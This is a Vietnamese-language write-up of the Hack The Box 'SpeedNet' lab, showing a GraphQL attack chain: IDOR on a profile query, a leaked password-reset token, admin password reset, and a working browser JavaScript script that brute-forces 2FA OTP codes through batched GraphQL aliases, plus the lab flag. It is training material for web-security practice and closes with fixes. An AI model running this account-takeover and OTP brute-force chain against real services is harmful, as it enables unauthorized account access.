---
title: SpeedNet [Easy] - Hack The Box
date: 2026-10-01 00:00:00
description: Writeup tiếng Việt cho lab SpeedNet của Hack The Box, tập trung vào GraphQL, IDOR, reset password và xác thực 2FA.
categories:
  - Web Exploit
  - Writeup CTF
tags:
  - Hack The Box
  - SpeedNet
  - GraphQL
  - IDOR
  - 2FA
  - Web Security
top_img: /img/SpeedNet/00-speednet-htb-banner.png
cover: /img/SpeedNet/00-speednet-htb-banner.png
toc: true
---

# SpeedNet

SpeedNet là một nền tảng ISP. Mục tiêu của bài lab là tận dụng các lỗi trong luồng GraphQL để chiếm quyền truy cập tài khoản quản trị và lấy flag ẩn.

> Môi trường sử dụng trong bài: Hack The Box. Thay `IP:PORT` bằng instance đang chạy của bạn.

## 1. Tạo tài khoản test

Đầu tiên, đăng ký một tài khoản bằng địa chỉ `test@email.htb`. Dịch vụ email của lab có thể xem tại:

```text
http://IP:PORT/emails/
```

<img src="../../../../img/SpeedNet/01-profile-settings.png" alt="Profile Settings của tài khoản test trên SpeedNet">

Sau khi đăng ký và đăng nhập, mọi request của ứng dụng đều có thể quan sát qua Burp Suite.
## 2. Xem schema GraphQL bằng extension trong Burp

Mình sử dụng **InQL - GraphQL Scanner**, một extension của Burp Suite dùng để hỗ trợ kiểm tra các ứng dụng GraphQL. InQL có thể đọc schema/introspection, tạo các query và mutation mẫu, đồng thời cung cấp các chức năng hỗ trợ kiểm thử ngay trong Burp.

Trong Burp, có thể mở request rồi chọn `Extensions -> InQL - GraphQL Scanner -> Generate queries` để tạo danh sách operation từ schema của ứng dụng.

<img src="../../../../img/SpeedNet/02-inql-extension.png" alt="Menu InQL GraphQL Scanner trong Burp Suite">

Sau đó, extension hiển thị các query và mutation mà endpoint GraphQL công khai:

<img src="../../../../img/SpeedNet/02-graphql-schema.png" alt="Danh sách query và mutation GraphQL được hiển thị trong Burp">

Ảnh trên là danh sách operation mà extension thu thập được. Những operation quan trọng trong chuỗi khai thác gồm `userProfile`, `devForgotPassword`, `resetPassword`, `login` và `verifyTwoFactor`.

## 3. IDOR trong truy vấn profile

Request profile của tài khoản hiện tại sử dụng biến `userId`. Mình thử thay giá trị này thành `1`:

```graphql
query GetUserProfile($userId: Int!) {
  userProfile(userId: $userId) {
    id
    email
    firstName
    lastName
    address
    phoneNumber
    twoFactorAuthEnabled
  }
}
```

```json
{
  "userId": 1
}
```

Response trả về thông tin của tài khoản quản trị, trong đó có email `admin@speednet.htb`. Đây là lỗi IDOR vì server không kiểm tra quyền sở hữu bản ghi trước khi trả dữ liệu profile.

<img src="../../../../img/SpeedNet/01-profile-idor.png" alt="Truy vấn profile với userId 1 trả về thông tin admin">

## 4. Lấy reset token qua devForgotPassword

Trong schema có mutation `devForgotPassword`. Gọi mutation với email admin:

```graphql
mutation {
  devForgotPassword(email: "admin@speednet.htb")
}
```

Response trả trực tiếp reset token trong nội dung phản hồi.

<img src="../../../../img/SpeedNet/03-dev-forgot-password.png" alt="devForgotPassword trả trực tiếp reset token">

## 5. Đặt lại mật khẩu admin

Dùng token vừa nhận được với mutation `resetPassword` và đặt một mật khẩu mới:

```graphql
mutation {
  resetPassword(
    token: "RESET_TOKEN"
    newPassword: "NEW_PASSWORD"
  )
}
```

Khi response xác nhận thành công, có thể dùng email admin và mật khẩu mới để thực hiện mutation `login`.

<img src="../../../../img/SpeedNet/04-reset-password-success.png" alt="resetPassword thực hiện thành công">

## 6. Đăng nhập và nhận temporary token 2FA

Vì tài khoản admin bật 2FA, request đăng nhập chưa trả JWT hoàn chỉnh. Thay vào đó, response có dạng:

```text
2FA_REQUIRED:TEMPORARY_TOKEN
```

`TEMPORARY_TOKEN` là token tạm dùng cho mutation `verifyTwoFactor`. Giao diện ứng dụng chuyển sang trang nhập OTP.

<img src="../../../../img/SpeedNet/05-two-factor-page.png" alt="Trang nhập mã OTP của SpeedNet">

## 7. Kiểm tra OTP bằng GraphQL aliases

### 7.1 Thử gửi nhiều OTP với cùng tên field

Ban đầu, mình thử gọi `verifyTwoFactor` nhiều lần trong cùng một mutation nhưng giữ nguyên tên field:

```graphql
mutation {
  verifyTwoFactor(token: "TEMPORARY_TOKEN", otp: "1000") { token }
  verifyTwoFactor(token: "TEMPORARY_TOKEN", otp: "1001") { token }
}
```

<img src="../../../../img/SpeedNet/07-otp-same-field-conflict.png" alt="GraphQL báo lỗi conflict khi gọi verifyTwoFactor nhiều lần cùng tên field">

Cách này không phù hợp vì cả hai field đều có cùng response key là `verifyTwoFactor` nhưng lại nhận các argument khác nhau. GraphQL validator báo lỗi conflict. Đây là lúc cần dùng alias.

### 7.2 Dùng GraphQL aliases

GraphQL alias là tên tùy chỉnh đặt trước một field trong operation. Alias cho phép gọi cùng một field nhiều lần trong một request nhưng mỗi lần dùng một tham số khác nhau.

Ví dụ, hai lần gọi `verifyTwoFactor` có thể đặt hai alias khác nhau:

```graphql
mutation {
  otp1000: verifyTwoFactor(token: "TEMPORARY_TOKEN", otp: "1000") { token }
  otp1001: verifyTwoFactor(token: "TEMPORARY_TOKEN", otp: "1001") { token }
}
```

Trong response, `otp1000` và `otp1001` là hai key độc lập. Vì vậy, nhiều OTP có thể được gửi trong cùng một GraphQL operation. Alias nào trả về object có trường `token` là alias tương ứng với OTP đúng.

Đoạn script dưới đây chia khoảng kiểm tra thành các batch và tạo một alias cho từng OTP. Thay `TOKEN_MOI_SAU_LOGIN` bằng temporary token nhận được sau khi đăng nhập:

```javascript
(async () => {
  const endpoint = location.origin + "/graphql";
  const token = "TOKEN_MOI_SAU_LOGIN";
  const batchSize = 200;

  for (let start = 1000; start <= 999999; start += batchSize) {
    const end = Math.min(start + batchSize - 1, 999999);

    const query = `mutation {
${Array.from({ length: end - start + 1 }, (_, i) => {
  const otp = String(start + i);
  return `otp${otp}: verifyTwoFactor(token:"${token}",otp:"${otp}"){token}`;
}).join("\n")}
}`;

    const response = await fetch(endpoint, {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ query })
    });

    const result = await response.json();
    const found = Object.entries(result.data || {})
      .find(([, value]) => value && value.token);

    console.log(`Tried ${start}-${end}`);

    if (found) {
      console.log("OTP FOUND:", found[0].replace("otp", ""));
      console.log("JWT:", found[1].token);
      break;
    }

    await new Promise(resolve => setTimeout(resolve, 1000));
  }
})();
```

<img src="../../../../img/SpeedNet/06-otp-bruteforce-script.png" alt="Script tạo nhiều GraphQL aliases để kiểm tra OTP">

Kết quả cuối cùng tìm được của mã OTP và JWT:

<img src="../../../../img/SpeedNet/07-admin-otp-jwt.png" alt="OTP 1628 và JWT tương ứng">

JWT trong output này là token sau khi hoàn tất xác thực 2FA. Có thể dùng nó cho các request GraphQL yêu cầu phiên đăng nhập quản trị.

## 8. Truy cập endpoint billing

Sau khi xác thực admin thành công, truy cập endpoint `/billing`. Request GraphQL dùng để đọc lịch sử hóa đơn là:

```json
{
  "query": "query { invoiceHistory(limit: 10) { id number amount status dueDate } }"
}
```

Response của `invoiceHistory` chứa flag trong dữ liệu hóa đơn, cụ thể ở trường `number` của bản ghi tương ứng.

Ảnh dưới đây là response thực tế của request trên. Bản ghi có trường `number` chứa flag của bài:

<img src="../../../../img/SpeedNet/08-billing-flag.png" alt="Response invoiceHistory chứa flag trong trường number">

## Flag

```text
HTB{gr4phql_3xpl01t_1n_a_nutsh3ll}
```

## Tổng kết

Chuỗi khai thác của SpeedNet gồm:

1. IDOR cho phép đọc profile admin bằng cách thay `userId`.
2. `devForgotPassword` làm lộ reset token.
3. Reset mật khẩu và đăng nhập tài khoản admin.
4. GraphQL aliases cho phép gửi nhiều lần kiểm tra OTP trong một operation.
5. JWT sau 2FA được dùng để truy cập `/billing` và lấy flag.

Các lỗi này cần được khắc phục bằng kiểm tra phân quyền ở resolver, không trả token nhạy cảm trong response, giới hạn tần suất OTP và kiểm soát chặt chẽ luồng 2FA.
